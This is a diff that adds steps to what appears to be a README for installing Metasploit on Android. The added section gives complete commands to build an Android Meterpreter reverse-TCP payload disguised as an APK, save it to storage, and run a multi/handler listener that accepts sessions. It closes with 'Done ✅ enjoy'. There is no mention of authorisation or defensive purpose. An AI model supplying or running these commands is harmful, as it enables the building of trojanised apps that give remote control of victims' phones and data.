@@ -34,3 +34,27 @@ After installation start Metasploit using the command:
 ```bash
 msfconsole
 ```
+## CREATE APK COMMAND
+```
+msfvenom -p android/meterpreter/reverse_tcp LHOST=your_public_ip LPORT=4444 -o appname.apk
+
+```
+
+## FOR SAVING APK
+
+```
+mv appname.apk /sdcard/
+
+```
+## Handler to connect apk
+```
+msfconsole
+
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+set ExitOnSession false
+exploit
+```
+##Done ✅ enjoy 
